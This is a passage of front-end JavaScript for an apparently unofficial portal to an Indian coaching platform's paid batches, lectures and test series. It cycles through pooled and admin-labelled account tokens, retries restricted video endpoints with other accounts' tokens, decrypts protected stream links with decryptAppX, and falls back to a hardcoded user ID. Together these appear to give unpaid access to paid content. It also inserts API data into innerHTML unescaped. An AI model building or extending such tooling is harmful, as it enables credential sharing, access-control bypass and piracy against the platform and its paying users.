        for (const ep of purchasedEndpoints) {
            const data = await fetchAPIWithToken(ep, tokObj, () => null);
            if (Array.isArray(data) && data.length > 0) {
                data.forEach(c => {
                    const cid = String(c.id || c.course_id || "").trim();
                    const cname = String(c.course_name || "").trim();
                    if (cid && !seenIds.has(cid) && (!cname || !seenIds.has(cname))) {
                        seenIds.add(cid); if (cname) seenIds.add(cname);
                        state.courseTokenMap[cid] = tokObj;
                        if (c.test_series_id) state.courseTestSeriesMap[cid] = String(c.test_series_id);
                        mergedCourses.push({ ...c, id: cid, _boundTokenObj: tokObj, _badgeText: tokObj.isAdmin ? `${tokObj.label}` : `🔑 ${tokObj.label || "My Account"}` });
                    }
                });
            }
        }
    }

    grid.innerHTML = "";
    if (mergedCourses.length === 0) {
        grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">❌ In accounts mein koi paid batch nahi mila.</div>`; return;
    }

    mergedCourses.forEach(c => {
        const logo = c.exam_logo || c.course_thumbnail || `https://placehold.co/600x320/0284c7/ffffff?text=Batch+${c.id}`;
        const safeName = (c.course_name || "RWA Paid Batch").replace(/'/g, "");
        grid.innerHTML += `
            <div onclick="openPaidCourse('${c.id}', '${safeName}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                <div>
                    <img src="${logo}" onerror="this.src='https://placehold.co/600x320/0284c7/ffffff?text=RWA+Batch'" class="w-full h-44 object-cover">
                    <div class="p-4">
                        <div class="flex justify-between items-center gap-2">
                            <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">BATCH #${c.id}</span>
                            <span class="text-[10px] font-bold text-sky-700 truncate">${c._badgeText}</span>
                        </div>
                        <h3 class="font-black text-base text-slate-900 mt-2">${c.course_name}</h3>
                    </div>
                </div>
                <div class="px-4 pb-4"><div class="btn-watch w-full text-center text-xs">Open Subjects & Batch Tests ➔</div></div>
            </div>`;
    });
}

async function renderFreeBatches() {
    if (!enforceCompulsoryLogin()) return;
    state.view = "batches"; document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = "Free Portal"; document.getElementById("headingText").textContent = "🆓 RWA Free Batches";

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Free Batches...</div>`;

    const primaryTok = USER_TOKENS[0];
    const freeData = await fetchAPIWithToken(`/get/courselist?start=-1`, primaryTok, () => DB.freeBatches);
    const list = (Array.isArray(freeData) && freeData.length > 0) ? freeData : DB.freeBatches;

    grid.innerHTML = "";
    list.forEach(c => {
        const cid = String(c.id || "free_101"); const name = (c.course_name || "Free Course").replace(/'/g, "");
        const logo = c.exam_logo || c.course_thumbnail || "https://placehold.co/600x320/059669/ffffff?text=Free+Batch";
        state.courseTokenMap[cid] = primaryTok;
        grid.innerHTML += `
            <div onclick="openFreeCourse('${cid}', '${name}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                <img src="${logo}" onerror="this.src='https://placehold.co/600x320/059669/ffffff?text=Free+Batch'" class="w-full h-44 object-cover">
                <div class="p-4"><span class="px-2.5 py-0.5 rounded-full bg-teal-100 text-teal-800 text-[10px] font-black">FREE BATCH</span><h3 class="font-black text-base text-slate-900 mt-2">${c.course_name || name}</h3><div class="btn-watch w-full text-center text-xs mt-3">Open Free Classes ➔</div></div>
            </div>`;
    });
}

function openPaidCourse(id, name) {
    const cid = String(id).trim(); state.cat = "paid"; state.courseId = cid; state.courseName = name;
    state.activeTokenObj = getCourseBoundToken(cid); window.ACTIVE_PLAYER_TOKEN = state.activeTokenObj.token;
    document.getElementById("subTabs").classList.remove("hidden"); document.getElementById("crumbText").textContent = `Batch #${cid}`; document.getElementById("headingText").textContent = name;
    loadCourseTab("subjects");
}

async function openFreeCourse(id, name) {
    const cid = String(id).trim(); state.cat = "free"; state.courseId = cid; state.courseName = name; state.view = "subjects";
    state.activeTokenObj = getCourseBoundToken(cid);
    document.getElementById("subTabs").classList.add("hidden"); document.getElementById("crumbText").textContent = "Free Batch"; document.getElementById("headingText").textContent = name;

    const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${cid}&start=-1`, state.activeTokenObj, () => DB.freeSubjects);
    const grid = document.getElementById("mainGrid"); grid.innerHTML = "";
    (subs.length ? subs : DB.freeSubjects).forEach(s => {
        const sname = (s.subject_name || "Free Subject").replace(/'/g, "");
        grid.innerHTML += `
            <div onclick="openFreeTopics('${s.subjectid}', '${sname}')" class="grid-card p-5 flex items-center justify-between cursor-pointer">
                <div><span class="text-[10px] font-extrabold text-teal-700 uppercase">Free Subject</span><h4 class="font-black text-base text-slate-900 mt-0.5">📘 ${s.subject_name}</h4></div>
                <span class="btn-watch text-xs">Topics ➔</span>
            </div>`;
    });
}

async function openFreeTopics(subId, subName) {
    state.view = "topics"; state.subjectId = subId; state.subjectName = subName; document.getElementById("headingText").textContent = subName;
    const topics = DB.freeTopics[subId] || [{ topicid: "ftop_1", topic_name: "All Classes" }];
    const grid = document.getElementById("mainGrid"); grid.innerHTML = "";
    topics.forEach(t => {
        grid.innerHTML += `<div onclick="openFreeLectures('${t.topicid}', '${t.topic_name}')" class="grid-card p-5 flex justify-between items-center cursor-pointer"><h4 class="font-black text-base text-slate-900">📂 ${t.topic_name}</h4><span class="btn-watch text-xs">Watch Classes ➔</span></div>`;
    });
}

function openFreeLectures(topId, topName) {
    state.view = "lectures"; state.topicId = topId; state.topicName = topName; document.getElementById("headingText").textContent = topName;
    const list = DB.freeLectures[topId] || []; document.getElementById("mainGrid").innerHTML = "";
    renderLectureList(list, state.activeTokenObj);
}

async function loadCourseTab(tab) {
    ["subjects", "live", "tests", "telegram"].forEach(t => { const el = document.getElementById("sub_" + t); if (el) el.className = (t === tab) ? "tab-pill active-pill" : "tab-pill"; });
    const grid = document.getElementById("mainGrid"); grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading...</div>`;
    const batchTok = getCourseBoundToken(state.courseId); state.activeTokenObj = batchTok;

    if (tab === "subjects") {
        state.view = "subjects";
        const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${state.courseId}&start=-1`, batchTok, () => DB.paidSubjects);
        grid.innerHTML = "";
        subs.forEach(s => {
            const name = s.subject_name || s.subjectname || "Subject";
            const logo = s.subject_logo || `https://placehold.co/80x80/0284c7/ffffff?text=${encodeURIComponent(name.slice(0, 3))}`;
            grid.innerHTML += `
                <div onclick="openPaidTopics('${s.subjectid}', '${name.replace(/'/g, "")}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                    <img src="${logo}" onerror="this.src='https://placehold.co/80x80/0284c7/ffffff?text=SUB'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
                    <div class="flex-1"><span class="px-2 py-0.5 rounded bg-sky-100 text-sky-800 text-[10px] font-black">SUBJECT #${s.subjectid}</span><h4 class="font-black text-base text-slate-900 mt-1">${name}</h4><p class="text-xs text-blue-600 font-extrabold mt-1">Explore Topics ➔</p></div>
                </div>`;
        });
    } else if (tab === "live") {
        const res = await fetchAPIWithToken(`/get/live_upcoming_course_classv2?courseid=${state.courseId}&start=-1`, batchTok, () => ({ upcoming: [] }));
        const list = Array.isArray(res) ? res : (res.upcoming || res.live || []);
        grid.innerHTML = ""; renderLectureList(list, batchTok);
    } else if (tab === "tests") {
        state.view = "batch_ts_subjects";
        const tsId = state.courseTestSeriesMap[state.courseId] || "700"; state.activeSeriesId = tsId; state.activeSeriesTitle = `${state.courseName} - Batch Tests`;
        const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, batchTok, () => DB.tsSubjects["700"]);
        const subList = (Array.isArray(subs) && subs.length > 0) ? subs : DB.tsSubjects["700"];
        grid.innerHTML = "";
        subList.forEach(s => {
            const sname = (s.subject_name || "Batch Test Subject").replace(/'/g, "");
            grid.innerHTML += `
                <div onclick="openBatchInternalTests('${tsId}', '${s.subjectid}', '${sname}')" class="grid-card p-5 flex items-center justify-between cursor-pointer">
                    <div><span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">SERIES #${tsId} • SUB #${s.subjectid}</span><h4 class="font-black text-base text-slate-900 mt-1.5">📝 ${s.subject_name}</h4><p class="text-xs text-indigo-600 font-bold mt-1">View Subject Quizzes & Tests ➔</p></div>
                    <span class="btn-watch text-xs">Open ➔</span>
                </div>`;
        });
    } else if (tab === "telegram") {
        grid.innerHTML = `<div class="col-span-full grid-card p-6 flex flex-wrap justify-between items-center gap-4"><div><span class="text-xs font-black text-blue-600 uppercase">Official Community</span><h4 class="font-black text-lg text-slate-900">✈️ RWA Batch Doubt Group</h4></div><a href="https://t.me/+ACPxjpf6oKQxM2U1" target="_blank" class="btn-watch text-xs no-underline px-5 py-3">Join Telegram ➔</a></div>`;
    }
}

async function openBatchInternalTests(tsId, subId, subName) {
    state.view = "batch_ts_tests"; state.activeSeriesId = tsId; state.activeTsSubId = subId; state.activeTsSubName = subName; document.getElementById("headingText").textContent = `📝 ${subName}`;
    const batchTok = getCourseBoundToken(state.courseId); state.activeTokenObj = batchTok;
    const uid = batchTok.userId || extractUidFromJwt(batchTok.token) || "4756316";
    const grid = document.getElementById("mainGrid"); grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Batch Quizzes & Tests...</div>`;
    const endpoint = `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&chapter_id=-1&userid=${uid}&search=&start=-1`;
    const titles = await fetchAPIWithToken(endpoint, batchTok, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["700_3171"]);
    renderTestTitlesGrid(titles, tsId, batchTok);
}

async function openPaidTopics(subId, subName) {
    state.view = "topics"; state.subjectId = subId; state.subjectName = subName;
    document.getElementById("subTabs").classList.add("hidden"); document.getElementById("crumbText").textContent = state.courseName; document.getElementById("headingText").textContent = `📂 ${subName}`;
    const batchTok = getCourseBoundToken(state.courseId); state.activeTokenObj = batchTok;
    const topics = await fetchAPIWithToken(`/get/alltopicfrmlivecourseclass?courseid=${state.courseId}&subjectid=${subId}&start=-1`, batchTok, () => DB.paidTopics[subId] || []);
    const grid = document.getElementById("mainGrid"); grid.innerHTML = "";
    topics.forEach(t => {
        const name = (t.topic_name || t.topicname || "Topic").replace(/'/g, "");
        grid.innerHTML += `<div onclick="openPaidLectures('${t.topicid}', '${name}')" class="grid-card p-5 flex justify-between items-center cursor-pointer"><div><span class="text-[10px] font-bold text-sky-700 uppercase">Topic Folder</span><h4 class="font-black text-base text-slate-900 mt-0.5">📁 ${name}</h4></div><span class="btn-watch text-xs">Classes ➔</span></div>`;
    });
}

async function openPaidLectures(topId, topName) {
    state.view = "lectures"; state.topicId = topId; state.topicName = topName;
    document.getElementById("crumbText").textContent = state.subjectName; document.getElementById("headingText").textContent = `🎬 ${topName}`;
    const batchTok = getCourseBoundToken(state.courseId); state.activeTokenObj = batchTok;
    const classes = await fetchAPIWithToken(`/get/livecourseclassbycoursesubtopconceptapiv3?courseid=${state.courseId}&subjectid=${state.subjectId}&topicid=${topId}&conceptid=1&start=0`, batchTok, () => DB.paidLectures[topId] || []);
    document.getElementById("mainGrid").innerHTML = ""; renderLectureList(classes, batchTok);
}

function normalizeQualityLabel(rawLabel) {
    const s = String(rawLabel || "").toLowerCase();
    if (s.includes("720")) return "720p"; if (s.includes("480")) return "480p"; if (s.includes("360")) return "360p"; if (s.includes("240")) return "240p"; if (s.includes("1080")) return "1080p"; if (s.includes("144")) return "144p";
    return "";
}

function extractQualitiesFromItem(item) {
    const rawMap = {};
    function addCandidate(rawQual, encPath, isM3u8Priority) {
        let u = decryptAppX(encPath);
        if (!u || !u.startsWith("http") || u.includes("playlist_eof.m3u8")) return;
        let cleanQ = normalizeQualityLabel(rawQual);
        if (!cleanQ) {
            const m = u.match(/\/(720p|480p|360p|240p|144p)\//i) || u.match(/bitrate=(720|480|360|240)/i);
            if (m) cleanQ = m[1].toLowerCase().endsWith("p") ? m[1].toLowerCase() : `${m[1]}p`; else cleanQ = "720p";
        }
        if (!rawMap[cleanQ] || isM3u8Priority || u.includes(".m3u8")) rawMap[cleanQ] = u;
    }
    (item.encrypted_links || []).forEach(q => addCandidate(q.quality, q.path, true));
    (item.livestream_links || []).forEach(q => addCandidate(q.quality, q.path, true));
    (item.download_links || []).forEach(q => addCandidate(q.quality, q.path, false));

    const decFile = decryptAppX(item.file_link || "");
    if (decFile) {
        if (decFile.startsWith("http") && !decFile.includes("playlist_eof.m3u8")) addCandidate("720p", decFile, decFile.includes(".m3u8"));
        else if (!decFile.startsWith("http") && decFile.length >= 10 && decFile.length <= 15) rawMap["720p"] = decFile;
    }

    const order = ["1080p", "720p", "480p", "360p", "240p", "144p"]; const sortedMap = {};
    order.forEach(k => { if (rawMap[k]) sortedMap[k] = rawMap[k]; });
    Object.keys(rawMap).forEach(k => { if (!sortedMap[k]) sortedMap[k] = rawMap[k]; });
    return sortedMap;
}

function renderLectureList(list, boundTokenObj) {
    const grid = document.getElementById("mainGrid"); state.currentLectureKeys = [];
    const lectureTok = boundTokenObj || getCourseBoundToken(state.courseId);
    if (!list || !list.length) { grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi class nahi hai.</div>`; return; }

    list.forEach((item, i) => {
        const key = `lec_${item.id || i}`; state.currentLectureKeys.push(key);
        const qMap = extractQualitiesFromItem(item);
        const pdf1 = resolvePdfUrl(item.pdf_link || item.ypdf_link, item.ypdf_link2);
        const pdf2 = resolvePdfUrl(item.pdf_link2, item.ypdf_link2);

        state.mediaMap[key] = { key: key, id: item.id, courseId: state.courseId, tokenObj: lectureTok, title: item.Title || "Class Lecture", date: item.date_and_time || "", thumb: item.thumbnail || "", qualities: qMap, pdf1: pdf1, pdf2: pdf2 };

        grid.innerHTML += `
            <div class="grid-card overflow-hidden flex flex-col justify-between">
                <div>
                    ${item.thumbnail ? `<img src="${item.thumbnail}" onerror="this.style.display='none'" class="w-full h-44 object-cover">` : ""}
                    <div class="p-4">
                        <span class="px-2.5 py-0.5 rounded-full bg-sky-100 text-sky-900 text-[10px] font-black">CLASS #${item.id || (i + 1)}</span>
                        <h4 class="font-black text-base text-slate-900 mt-2">${item.Title}</h4>
                        ${item.date_and_time ? `<p class="text-[11px] text-slate-500 font-semibold mt-1">🕒 ${item.date_and_time}</p>` : ""}
                    </div>
                </div>
                <div class="p-4 pt-2 border-t border-sky-100 flex flex-wrap gap-2">
                    <button onclick="playClassInRwaPlayer('${key}')" class="btn-watch flex-1 text-xs">▶ Watch Video</button>
                    ${pdf1 ? `<button onclick="openPdf('${key}', 1)" class="btn-pdf1 text-xs">📄 PDF 1</button>` : ""}
                    ${pdf2 ? `<button onclick="openPdf('${key}', 2)" class="btn-pdf2 text-xs">📄 PDF 2</button>` : ""}
                </div>
            </div>`;
    });
}

// =====================================================
// PLAYER ENGINE
// =====================================================
async function playClassInRwaPlayer(key) {
    state.activeKey = key; const info = state.mediaMap[key]; if (!info) return;
    const targetCourseId = info.courseId || state.courseId; const batchTok = info.tokenObj || getCourseBoundToken(targetCourseId);
    state.activeTokenObj = batchTok; window.ACTIVE_PLAYER_TOKEN = batchTok.token;

    showSlide("slidePlayer"); document.getElementById("playingTitle").textContent = "▶ " + info.title;
    closeInlinePdfAndReset(); renderNextClassesBelowPlayer(key);

    const pPdf1 = document.getElementById("playerPdf1"); const pPdf2 = document.getElementById("playerPdf2");
    if (pPdf1) { if (info.pdf1) pPdf1.classList.remove("hidden"); else pPdf1.classList.add("hidden"); }
    if (pPdf2) { if (info.pdf2) pPdf2.classList.remove("hidden"); else pPdf2.classList.add("hidden"); }

    const urlInput = document.getElementById("url");
    if (state.cat === "paid" && info.id) {
        const videoEndpoint = `/get/fetchVideoDetailsById?course_id=${targetCourseId}&video_id=${info.id}&ytflag=0&folder_wise_course=0&lc_app_api_url=`;
        let fresh = await fetchAPIWithToken(videoEndpoint, batchTok, () => null);
        let freshMap = (fresh && typeof fresh === "object") ? extractQualitiesFromItem(fresh) : {};

        if (Object.keys(freshMap).length === 0 && Object.keys(info.qualities || {}).length === 0) {
            for (const fallbackTok of await getAllTokensForCourses()) {
                if (fallbackTok.token === batchTok.token) continue;
                const retryFresh = await fetchAPIWithToken(videoEndpoint, fallbackTok, () => null);
                if (retryFresh && typeof retryFresh === "object") {
                    const retryMap = extractQualitiesFromItem(retryFresh);
                    if (Object.keys(retryMap).length > 0) {
                        fresh = retryFresh; freshMap = retryMap; info.tokenObj = fallbackTok; state.courseTokenMap[targetCourseId] = fallbackTok;
                        state.activeTokenObj = fallbackTok; window.ACTIVE_PLAYER_TOKEN = fallbackTok.token; break;
                    }
                }
            }
        }
        if (fresh && typeof fresh === "object") {
            info.qualities = { ...info.qualities, ...freshMap };
            const fPdf1 = resolvePdfUrl(fresh.pdf_link || fresh.ypdf_link, fresh.ypdf_link2);
            const fPdf2 = resolvePdfUrl(fresh.pdf_link2, fresh.ypdf_link2);
            if (fPdf1 && !info.pdf1) { info.pdf1 = fPdf1; if (pPdf1) pPdf1.classList.remove("hidden"); }
            if (fPdf2 && !info.pdf2) { info.pdf2 = fPdf2; if (pPdf2) pPdf2.classList.remove("hidden"); }
        }
    }

    const validKeys = Object.keys(info.qualities).filter(k => { const u = info.qualities[k]; return u && !u.includes("playlist_eof.m3u8"); });
    if (validKeys.length > 0 && urlInput) {
        const bestKey = validKeys.find(k => k === "720p") || validKeys[0];
        urlInput.value = info.qualities[bestKey]; urlInput.dataset.token = state.activeTokenObj.token; urlInput.dataset.userid = state.activeTokenObj.userId || "4756316";
        if (typeof start === "function") start();
    }
}

function renderNextClassesBelowPlayer(activeKey) {
    const grid = document.getElementById("nextClassesGrid"); const countBadge = document.getElementById("nextClassesCount"); if (!grid) return;
    const allKeys = state.currentLectureKeys || []; const currentIndex = allKeys.indexOf(activeKey);
    const orderedNextKeys = currentIndex >= 0 ? [...allKeys.slice(currentIndex + 1), ...allKeys.slice(0, currentIndex)] : allKeys.filter(k => k !== activeKey);
    if (countBadge) countBadge.textContent = `${orderedNextKeys.length} Classes`;

    if (orderedNextKeys.length === 0) { grid.innerHTML = `<div class="col-span-full py-6 text-center text-xs font-bold text-slate-500">Is topic mein yeh aakhri class hai.</div>`; return; }

    grid.innerHTML = orderedNextKeys.map((k, idx) => {
        const item = state.mediaMap[k]; if (!item) return "";
        return `
            <div class="grid-card p-3.5 flex flex-col justify-between">
                <div class="flex items-start gap-3">
                    <div class="w-10 h-10 rounded-xl bg-sky-100 text-sky-800 font-black text-xs flex items-center justify-center shrink-0">#${idx + 1}</div>
                    <div class="min-w-0 flex-1"><span class="text-[10px] font-black text-sky-700 uppercase">Up Next</span><h5 class="font-extrabold text-sm text-slate-900 line-clamp-2 mt-0.5">${item.title}</h5></div>
                </div>
                <div class="flex gap-2 mt-3 pt-2 border-t border-sky-100">
                    <button onclick="playClassInRwaPlayer('${k}')" class="btn-watch flex-1 text-xs py-2">▶ Play Next</button>
                    ${item.pdf1 ? `<button onclick="openInlinePdfForKey('${k}', 1)" class="btn-pdf1 text-xs py-2">📄 PDF</button>` : ""}
                </div>
            </div>`;
    }).join("");
}

window.openActivePlayerPdf = function(num) { if (!state.activeKey) return; openInlinePdfForKey(state.activeKey, num); };
window.openInlinePdfForKey = function(key, num) {
    const info = state.mediaMap[key]; if (!info) return; const u = num === 2 ? info.pdf2 : info.pdf1; if (!u) return;
    state.inlinePdfUrl = u; document.getElementById("inlinePdfTitle").textContent = `📄 ${info.title} (PDF ${num})`; document.getElementById("inlineRawPdfLink").href = u;
    document.getElementById("nextClassesBox").classList.add("hidden"); document.getElementById("inlinePdfBox").classList.remove("hidden");
    setInlinePdfMode("appx"); document.getElementById("inlinePdfBox").scrollIntoView({ behavior: "smooth" });
};

window.setInlinePdfMode = function(mode) {
    const frame = document.getElementById("inlinePdfFrame"); const u = state.inlinePdfUrl; if (!u || !frame) return;
    if (mode === "appx") frame.src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
    else frame.src = `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
};
window.switchBottomToNextClasses = function() { closeInlinePdfAndReset(); };
function closeInlinePdfAndReset() { const frame = document.getElementById("inlinePdfFrame"); if (frame) frame.src = ""; const pdfBox = document.getElementById("inlinePdfBox"); const nextBox = document.getElementById("nextClassesBox"); if (pdfBox) pdfBox.classList.add("hidden"); if (nextBox) nextBox.classList.remove("hidden"); }
function changeLectureQuality(qLabel) { const info = state.mediaMap[state.activeKey]; if (info && info.qualities[qLabel]) { const urlInput = document.getElementById("url"); urlInput.value = info.qualities[qLabel]; if (info.tokenObj) { urlInput.dataset.token = info.tokenObj.token; window.ACTIVE_PLAYER_TOKEN = info.tokenObj.token; } if (typeof start === "function") start(); } }

// =====================================================
// TEST SERIES EXPLORER
// =====================================================
async function openTestSeriesExplorer(mode) {
    if (!enforceCompulsoryLogin()) return; state.tsMode = mode; state.view = "ts_list"; showSlide("slideExplorer"); document.getElementById("subTabs").classList.add("hidden");
    const grid = document.getElementById("mainGrid"); grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading Official RWA Test Series...</div>`;
    const primaryTok = USER_TOKENS[0]; state.activeTokenObj = primaryTok;

    if (mode === "paid_ts") {
        document.getElementById("crumbText").textContent = "Official Exam Series"; document.getElementById("headingText").textContent = "🏆 Paid Test Series";
        const p0 = await fetchAPIWithToken(`/get/test_series?start=0&search=&client_api_url=&exam_id=`, primaryTok, () => []);
        const p10 = await fetchAPIWithToken(`/get/test_series?start=10&search=&client_api_url=&exam_id=`, primaryTok, () => []);
        let combined = [...(Array.isArray(p0) ? p0 : []), ...(Array.isArray(p10) ? p10 : [])];
        if (combined.length === 0) combined = DB.paidTestSeries;

        const seen = new Set(); grid.innerHTML = "";
        combined.forEach(ts => {
            if (seen.has(String(ts.id))) return; seen.add(String(ts.id));
            const title = (ts.title || "Paid Test Series").replace(/'/g, ""); const logo = ts.logo || "https://placehold.co/600x320/4f46e5/ffffff?text=Test+Series";
            grid.innerHTML += `
                <div onclick="openTestSeriesSubjects('${ts.id}', '${title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                    <div><img src="${logo}" onerror="this.src='https://placehold.co/600x320/4f46e5/ffffff?text=RWA+Test+Series'" class="w-full h-44 object-cover"><div class="p-4"><span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">SERIES #${ts.id}</span><h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3></div></div>
                    <div class="px-4 pb-4"><div class="btn-watch w-full text-center text-xs">Open Test Subjects ➔</div></div>
                </div>`;
        });
    } else {
        document.getElementById("crumbText").textContent = "Weekly Mock Tests"; document.getElementById("headingText").textContent = "📝 Free Test Series";
        const f0 = await fetchAPIWithToken(`/get/quiz_test_series?start=0&exam_id=`, primaryTok, () => []);
        const f10 = await fetchAPIWithToken(`/get/quiz_test_series?start=10&exam_id=`, primaryTok, () => []);
        let combined = [...(Array.isArray(f0) ? f0 : []), ...(Array.isArray(f10) ? f10 : [])];
        if (combined.length === 0) combined = DB.freeTestSeries;

        const seen = new Set(); grid.innerHTML = "";
        combined.forEach(ts => {
            if (seen.has(String(ts.id))) return; seen.add(String(ts.id));
            const title = (ts.title || "Free Test Series").replace(/'/g, ""); const logo = ts.logo || "https://placehold.co/600x320/0891b2/ffffff?text=Free+Tests";
            grid.innerHTML += `
                <div onclick="openTestSeriesSubjects('${ts.id}', '${title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                    <div><img src="${logo}" onerror="this.src='https://placehold.co/600x320/0891b2/ffffff?text=Free+Test+Series'" class="w-full h-44 object-cover"><div class="p-4"><span class="px-2.5 py-0.5 rounded-full bg-teal-100 text-teal-900 text-[10px] font-black">FREE SERIES #${ts.id}</span><h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3></div></div>
                    <div class="px-4 pb-4"><div class="btn-watch w-full text-center text-xs">View All Mock Tests ➔</div></div>
                </div>`;
        });
    }
}

async function openTestSeriesSubjects(tsId, tsTitle) {
    state.activeSeriesId = tsId; state.activeSeriesTitle = tsTitle; state.view = "ts_subjects";
    document.getElementById("crumbText").textContent = `Test Series #${tsId}`; document.getElementById("headingText").textContent = tsTitle;
    const grid = document.getElementById("mainGrid"); grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Test Series Subjects...</div>`;
    const useTok = state.activeTokenObj || USER_TOKENS[0];
    const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, useTok, () => DB.tsSubjects[tsId] || []);

    if (!subs || subs.length === 0 || (subs.length === 1 && String(subs[0].subjectid) === "-1")) { openTestSeriesTitles(tsId, "-1", tsTitle); return; }
    grid.innerHTML = "";
    subs.forEach(s => {
        const sname = (s.subject_name || "Mock Tests").replace(/'/g, "");
        const logo = s.subject_logo || `https://placehold.co/80x80/4f46e5/ffffff?text=${encodeURIComponent(sname.slice(0, 3))}`;
        grid.innerHTML += `
            <div onclick="openTestSeriesTitles('${tsId}', '${s.subjectid}', '${sname}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                <img src="${logo}" onerror="this.src='https://placehold.co/80x80/4f46e5/ffffff?text=TEST'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
                <div class="flex-1"><span class="px-2 py-0.5 rounded bg-indigo-100 text-indigo-900 text-[10px] font-black">SUBJECT #${s.subjectid}</span><h4 class="font-black text-base text-slate-900 mt-1">${s.subject_name}</h4><p class="text-xs text-blue-600 font-extrabold mt-1">Open Mock Tests ➔</p></div>
            </div>`;
    });
}

async function openTestSeriesTitles(tsId, subId, subName) {
    state.view = "ts_tests"; state.activeSeriesId = tsId; state.activeTsSubId = String(subId); state.activeTsSubName = subName;
    document.getElementById("crumbText").textContent = state.activeSeriesTitle; document.getElementById("headingText").textContent = `📝 ${subName}`;
    const grid = document.getElementById("mainGrid"); grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Fetching Mock Tests...</div>`;
    const useTok = state.activeTokenObj || USER_TOKENS[0]; const uid = useTok.userId || extractUidFromJwt(useTok.token) || "4756316";
    const ep = String(subId) === "-1" ? `/get/test_titlev2?testseriesid=${tsId}&subject_id=-1&chapter_id=-1&userid=${uid}&search=&start=-1` : `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=${uid}&search=&start=-1`;
    const list = await fetchAPIWithToken(ep, useTok, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["743_-1"] || []);
    renderTestTitlesGrid(list, tsId, useTok);
}

function renderTestTitlesGrid(list, tsId, boundTok) {
    const grid = document.getElementById("mainGrid"); const testTok = boundTok || state.activeTokenObj || USER_TOKENS[0];
    if (!list || !list.length) { grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is section mein abhi koi test uplabdh nahi hai.</div>`; return; }
    grid.innerHTML = "";
    list.forEach((t, idx) => {
        const tKey = `test_${t.id || idx}`; const pdfUrl = resolvePdfUrl(t.pdf_url || t.test_solutions_pdf, t.pdf_url);
        state.testMap[tKey] = { ...t, seriesId: tsId || t.test_series_id, resolvedPdf: pdfUrl, tokenObj: testTok };
        grid.innerHTML += `
            <div class="grid-card p-5 flex flex-col justify-between">
                <div>
                    <div class="flex justify-between items-center gap-2"><span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">TEST #${t.id || (idx + 1)}</span><span class="text-[11px] font-extrabold text-emerald-700">⏱️ ${t.time || 60} Mins</span></div>
                    <h4 class="font-black text-base text-slate-900 mt-2">${t.title}</h4>
                    <div class="flex gap-3 mt-2 text-xs font-bold text-slate-600"><span>❓ ${t.questions || 50} Qs</span><span>🏆 ${t.marks || 100} Marks</span></div>
                </div>
                <div class="flex flex-wrap gap-2 mt-4 pt-3 border-t border-sky-100">
                    <button onclick="launchCbtTest('${tKey}')" class="btn-watch flex-1 text-xs">🚀 Attempt Live Test</button>
                    ${pdfUrl ? `<button onclick="openTestPdf('${tKey}')" class="btn-pdf1 text-xs">📄 Test PDF</button>` : ""}
                </div>
            </div>`;
    });
}

function openTestPdf(tKey) {
    const t = state.testMap[tKey]; if (!t || !t.resolvedPdf) return; state.currentPdfUrl = t.resolvedPdf;
    document.getElementById("pdfTitle").textContent = `📄 ${t.title} (Paper PDF)`; document.getElementById("rawPdfLink").href = t.resolvedPdf;
    showSlide("slidePdf"); setPdfMode("appx");
}

function openPdf(key, num) {
    const info = state.mediaMap[key]; if (!info) return; const u = num === 2 ? info.pdf2 : info.pdf1; if (!u) return;
    const vid = document.getElementById("video"); if (vid && !vid.paused) vid.pause();
    state.currentPdfUrl = u; document.getElementById("pdfTitle").textContent = `📄 ${info.title} (PDF ${num})`; document.getElementById("rawPdfLink").href = u;
    showSlide("slidePdf"); setPdfMode("appx");
}

function setPdfMode(mode) {
    const frame = document.getElementById("pdfFrame"); const u = state.currentPdfUrl; if (!u) return;
    if (mode === "appx") frame.src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
    else frame.src = `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
}

function closePdfSlide() { document.getElementById("pdfFrame").src = ""; showSlide(state.previousSlide || "slideExplorer"); }

// =====================================================
// USER PERSONAL TOKEN LIST
// =====================================================
function renderTokenManagerList() {
    const container = document.getElementById("tokenListContainer"); if (!container) return; container.innerHTML = "";
